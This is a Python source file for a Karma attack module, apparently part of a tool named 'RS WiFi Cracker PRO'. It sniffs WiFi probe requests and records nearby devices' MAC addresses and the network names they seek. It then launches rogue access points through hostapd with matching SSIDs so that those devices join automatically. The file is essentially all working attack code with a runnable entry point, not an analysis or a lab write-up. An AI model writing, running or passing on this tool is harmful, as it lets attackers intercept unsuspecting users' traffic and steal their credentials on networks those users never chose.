#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RS WiFi Cracker PRO - Karma Attack Module
Auto-connect probing and exploitation
"""

import os
import time
import subprocess
import threading
from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime
import queue

try:
    from scapy.all import Dot11, Dot11ProbeReq, Dot11Elt, RadioTap, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class ProbeRequest:
    """WiFi probe request"""
    client_mac: str
    ssid: str = ""
    rssi: int = 0
    timestamp: str = ""
    responded: bool = False
    
    def to_dict(self) -> Dict:
        return {
            'client_mac': self.client_mac,
            'ssid': self.ssid,
            'rssi': self.rssi,
            'timestamp': self.timestamp or datetime.now().isoformat(),
            'responded': self.responded
        }


class KarmaAttacker:
    """Karma Attack Engine - Auto-connect exploitation"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.probe_queue = queue.Queue()
        self.probes: List[ProbeRequest] = []
        self.responded_ssids: Dict[str, bool] = {}
        self.hostapd_process = None
        self.stats = {
            'probes_received': 0,
            'ssids_responded': 0,
            'clients_connected': 0
        }
    
    def start(self) -> bool:
        """Start Karma attack"""
        self.running = True
        
        # Start probe listener
        if SCAPY_AVAILABLE:
            return self._start_scapy_karma()
        else:
            return self._start_airodump_karma()
    
    def _start_scapy_karma(self) -> bool:
        """Start Karma attack using scapy"""
        def packet_handler(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(Dot11ProbeReq):
                client_mac = pkt[Dot11].addr2
                
                # Get SSID from probe
                ssid = ""
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 0:  # SSID
                            ssid = elt.info.decode('utf-8', errors='ignore')
                            break
                        elt = elt.payload
                
                # Get RSSI
                rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -50
                
                probe = ProbeRequest(
                    client_mac=client_mac,
                    ssid=ssid,
                    rssi=rssi
                )
                
                self.probes.append(probe)
                self.probe_queue.put(probe)
                self.stats['probes_received'] += 1
                
                # Respond to probe
                if ssid and ssid not in self.responded_ssids:
                    self._respond_to_probe(ssid, client_mac)
                    self.responded_ssids[ssid] = True
                    self.stats['ssids_responded'] += 1
        
        # Start sniffing in background
        def sniff_thread():
            sniff(iface=self.interface, prn=packet_handler, store=0)
        
        thread = threading.Thread(target=sniff_thread, daemon=True)
        thread.start()
        
        return True
    
    def _start_airodump_karma(self) -> bool:
        """Start Karma attack using airodump + hostapd"""
        # Use airodump to detect probe requests
        output_file = f"/tmp/karma_scan_{int(time.time())}"
        
        cmd = ['sudo', 'airodump-ng', self.interface, '-w', output_file,
               '--output-format', 'csv', '--write-interval', '2']
        
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        def monitor_csv():
            csv_file = f"{output_file}-01.csv"
            last_size = 0
            
            while self.running:
                time.sleep(2)
                
                if not os.path.exists(csv_file):
                    continue
                
                try:
                    size = os.path.getsize(csv_file)
                    if size > last_size:
                        self._parse_probes_csv(csv_file)
                        last_size = size
                except:
                    pass
            
            # Cleanup
            process.terminate()
            try:
                os.remove(csv_file)
            except:
                pass
        
        thread = threading.Thread(target=monitor_csv, daemon=True)
        thread.start()
        
        return True
    
    def _parse_probes_csv(self, csv_file: str):
        """Parse probe requests from CSV"""
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
            
            lines = content.split('\n')
            in_clients = False
            
            for line in lines:
                if 'Station MAC' in line:
                    in_clients = True
                    continue
                
                if in_clients and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 12:
                        client_mac = parts[0].strip()
                        probe_ssid = parts[11].strip().strip('"') if len(parts) > 11 else ""
                        
                        if probe_ssid and probe_ssid not in ['[Length: 0]', '']:
                            probe = ProbeRequest(
                                client_mac=client_mac,
                                ssid=probe_ssid
                            )
                            
                            self.probes.append(probe)
                            self.probe_queue.put(probe)
                            self.stats['probes_received'] += 1
                            
                            # Respond
                            if probe_ssid not in self.responded_ssids:
                                self._respond_to_probe(probe_ssid, client_mac)
                                self.responded_ssids[probe_ssid] = True
                                self.stats['ssids_responded'] += 1
        
        except Exception:
            pass
    
    def _respond_to_probe(self, ssid: str, client_mac: str) -> bool:
        """Respond to probe request with rogue AP"""
        # Create hostapd config for this SSID
        config = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
channel=1
hw_mode=g
ignore_broadcast_ssid=0
"""

        config_file = f'/tmp/hostapd_karma_{ssid.replace(" ", "_")}.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        # Start hostapd (background)
        try:
            process = subprocess.Popen(
                ['sudo', 'hostapd', config_file],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # Keep running for a while
            threading.Timer(30, lambda: process.terminate()).start()
            
            return True
        except:
            return False
    
    def get_probe(self) -> Optional[ProbeRequest]:
        """Get probe request (non-blocking)"""
        try:
            return self.probe_queue.get_nowait()
        except queue.Empty:
            return None
    
    def get_all_probes(self) -> List[ProbeRequest]:
        """Get all probe requests"""
        return self.probes.copy()
    
    def get_responded_ssids(self) -> List[str]:
        """Get SSIDs we've responded to"""
        return list(self.responded_ssids.keys())
    
    def stop(self):
        """Stop Karma attack"""
        self.running = False
        
        # Kill any hostapd processes
        subprocess.run('sudo pkill hostapd', shell=True, capture_output=True)
        
        # Clean up config files
        for f in os.listdir('/tmp'):
            if f.startswith('hostapd_karma_'):
                try:
                    os.remove(f'/tmp/{f}')
                except:
                    pass
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python karma.py <interface>")
        sys.exit(1)
    
    interface = sys.argv[1]
    
    karma = KarmaAttacker(interface)
    
    print("Starting Karma attack...")
    karma.start()
    
    print("Listening for probe requests. Press Ctrl+C to stop.\n")
    
    try:
        while True:
            probe = karma.get_probe()
            if probe:
                print(f"Probe: {probe.client_mac} -> {probe.ssid}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        karma.stop()
        print("\nKarma attack stopped")
        print(f"Stats: {karma.get_stats()}")
